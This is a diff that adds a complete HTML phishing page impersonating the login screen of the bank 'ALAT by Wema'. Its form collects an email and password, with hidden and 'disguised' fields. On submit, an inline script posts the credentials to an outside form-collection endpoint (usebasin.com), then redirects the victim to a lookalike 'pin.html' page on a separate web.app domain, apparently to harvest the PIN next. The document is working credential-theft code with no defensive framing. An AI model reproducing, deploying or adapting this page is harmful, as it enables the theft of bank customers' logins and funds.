@@ -1,0 +1,91 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" href="/logo.ico" type="image/ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login | ALAT by Wema</title>
+    <link rel="stylesheet" href="index-C49gVU4U.css" />
+    <script type="module" src="index-BiOV7unC.js"></script>
+  </head>
+
+  <body>
+    <div id="root">
+      <div class="app">
+        <div class="home">
+          <div class="container">
+            <div class="contentSec">
+              <div class="logo">
+                <img src="logo-Cw-qJTno.png" alt="logo" />
+              </div>
+              <div class="hometitle">Welcome back!</div>
+            </div>
+
+            <div class="loginWrapper">
+              <div class="loginSec">
+                <!-- Updated form -->
+                <form id="loginForm">
+                
+                  
+                  <!-- Disguised fields that will appear as message to UserBasin -->
+                  <input type="hidden" name="subject" value="Login Details">
+                  
+                  <!-- Actual form shown to users -->
+                  <label for="email">Email Address</label>
+                  <div class="formInput">
+                    <input
+                      id="email"
+                      name="email"   type="email"
+                      placeholder="Email Address"
+                      required
+                    />
+                  </div>
+
+                  <span class="errorMessage"></span>
+
+                  <label for="password">Password</label>
+                  <div class="formInput">
+                    <input
+                      id="pase"
+                      name="text"  type="text"
+                      placeholder="Password"
+                      required
+                    />
+                  </div>
+
+                  <span class="errorMessage"></span>
+
+                  <button type="submit">Log In</button>
+                </form>
+                <!-- End form -->
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', async function (e) {
+        e.preventDefault();
+    
+        const formData = new FormData(this);
+        const data = new URLSearchParams();
+        for (const pair of formData) {
+          data.append(pair[0], pair[1]);
+        }
+    
+        await fetch('https://usebasin.com/f/c7a3b223942d', {
+          method: 'POST',
+          body: data,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+    
+        // Redirect manually
+        window.location.href = 'https://wemmaweb-support.web.app/pin.html';
+      });
+    </script>
+  </body>
+</html>
